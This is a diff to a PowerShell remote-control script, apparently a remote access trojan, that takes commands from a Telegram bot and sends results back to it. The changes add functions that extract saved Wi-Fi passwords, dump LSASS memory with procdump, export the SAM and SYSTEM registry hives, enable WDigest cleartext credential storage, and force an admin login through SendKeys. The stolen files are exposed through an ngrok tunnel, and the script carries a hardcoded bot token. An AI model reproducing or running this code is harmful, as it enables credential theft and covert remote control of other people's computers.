@@ -1,4 +1,27 @@
 
+function run-asAdmin($path,$password)
+{
+    if (is-administartor)
+    {
+        return "alredy ru as admin."
+    }
+    $vbscript = @('set WshShell = WScript.CreateObject("WScript.Shell")'
+    'WshShell.Run "cmd"'
+    'WScript.Sleep 100 '
+    'WshShell.AppActivate'+ "C:\Windows\system32\cmd.exe"
+    'WScript.Sleep 100'
+    'WshShell.SendKeys'+ "runas /user:administrator $path"
+    'WshShell.SendKeys'+ "{ENTER}"
+    'WshShell.SendKeys'+ "$password"
+    'WshShell.SendKeys'+ "{ENTER}")
+    echo '' > vbscript.vbs
+    foreach($i in $vbscript)
+    {
+        echo "$i`n" >> vbscript.vbs
+    }
+    start-process vbscript.vbs
+}
+
 function read-comm()
 {
     Param
@@ -70,6 +93,37 @@ function First-offset
 
 }
 
+function get-wifiPasswords
+{   
+    $test = netsh wlan show profiles
+    $profiles = @()
+    foreach($i in $test)
+    {
+        if($i.contains("All User Profile"))
+        {
+            $profiles+=$i.Split(':')[-1].Trim()
+        }
+    }
+    $passwords = ""
+    foreach($i in $profiles)
+    {
+        $password = netsh wlan show profile $i key = clear
+        if (([string]$password).Contains("Key Content"))
+        {
+            foreach($n in $password)
+            {
+                if ($n.contains("Key Content"))
+                {
+                    $keyCon = $n.split(' : ')[-1].Trim()
+                    $passwords+="$i     :    $keyCon`n"
+                }
+            }
+        }
+    }
+    return $passwords
+}
+
+
 
 function start-myshell($apiToken,$chat_id,$urlToNG)
 {
@@ -122,11 +176,46 @@ function start-myshell($apiToken,$chat_id,$urlToNG)
             {
                 $foo=$offset
                 $command = $message[0]
-                $output = Excmd $command
-                Send-data -data $output -chat_id $chat_id -apiToken $apiToken
-                
+
+                if ($command.contains('get wifi passwords'))
+                {
+                    $output = get-wifiPasswords
+                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken
+                }
+
+                ElseIf($command.contains('save password as clear text'))
+                {
+                    $output = savePassword-clearText
+                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken   
+                }
+
+                ElseIf($command.contains('get dump lsass file'))
+                {
+                    $output = get-lssasDump
+                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken   
+                }
+
+                ElseIf($command.contains('force run as admin -p'))
+                {
+                    $password = ($command.split('-p')[0]).Trim()
+                    $path = [Environment]::GetCommandLineArgs()[0]
+                    $path = [string]$path
+                    run-asAdmin -path $path -password $password
+                    # $output run-asAdmin -password $pass -path $path 
+                }
+                ElseIf($command.contains('get dump sam file'))
+                {
+                    $output = dump-sam
+                    foreach($i in $output)
+                    {
+                        Send-data -data $i -chat_id $chat_id -apiToken $apiToken  
+                    }
+                }
+                else{
+                    $output = Excmd $command
+                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken
+                }
             }
-            
         }    
         
         catch 
@@ -241,6 +330,91 @@ function Add-Run
 }
 
 
+function is-administartor
+{
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+
+function get-file($path,$urlToNG)
+{
+    $file = Get-Item $path
+    $basename = $file.basename + $file.Extension
+    $path = $file.DirectoryName
+    $path = ($path.replace(($PWD | select -Expand Path),"")).split('\')
+    $baseUrl = ""
+    foreach($i in $path)
+    {
+        $baseUrl+="$i/"
+    }
+    return "$urlToNG/edit/$baseUrl$basename"
+}
+
+function get-lssasDump
+{
+    $res = Invoke-WebRequest http://localhost:4040/api/tunnels
+    $res = $res | ConvertFrom-Json
+    $res = $res.tunnels ; $urll = $res.public_url
+    try
+    {
+       $test = procdump -ma lsass.exe C:\ngrok\lssass.dmp | out-string
+       if($test.contains('Access is denied'))
+       {
+           return 'Error while trying to creat dump file. "access denied"'
+       }
+    }
+    catch{
+        return 'Error while trying to creat dump file. "access denied"'
+    }
+    return get-file -urlToNG $urll -path "C:\ngrok\lssass.dmp"
+}
+
+function get-base64OfFile($path,$urlToNG)
+{
+    $file = Get-Item $path
+    $basename = $file.basename + $file.Extension
+    $path = $file.DirectoryName
+    $loc = "$urlToNG/edit$basename"
+    Copy-Item -Path path -Destination [System.Environment]::CurrentDirectory
+    return ""
+}
+
+function dump-sam{
+    $ngrokUrl = get-ngrokToken
+    $files = @()
+    try{
+        remove-item C:\ngrok\dumps -Recurse | out-null
+        mkdir C:\ngrok\dumps | out-null
+    }
+    catch{
+        mkdir C:\ngrok\dumps | out-null
+    }
+    echo y | reg save hklm\sam C:\ngrok\dumps\sam | out-null
+    echo y | reg save hklm\system C:\ngrok\dumps\system | out-null
+    $files+=get-file -path 'C:\ngrok\dumps\sam' -urlToNG $ngrokUrl
+    $files+=get-file -path 'C:\ngrok\dumps\system' -urlToNG $ngrokUrl
+    return $files 
+}
+
+function savePassword-clearText
+{
+    if (-not(is-administartor))
+    {
+        return "Must run as admin"
+    }
+    try{
+        echo y | reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+        return "Successfully completed!"
+    }
+    catch 
+    {
+        return "Failed!"
+    }
+}
+
+
+Set-Location C:\
 try
 {
     $path_to_ngrok = "C:\ngrok\ngrok.exe"
@@ -262,5 +436,4 @@ catch{
 $apiToken = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
 $chat_id = '-1001830797904'
 start-myshell -apiToken $apiToken -chat_id $chat_id -urlToNG $urlToNG
-
 
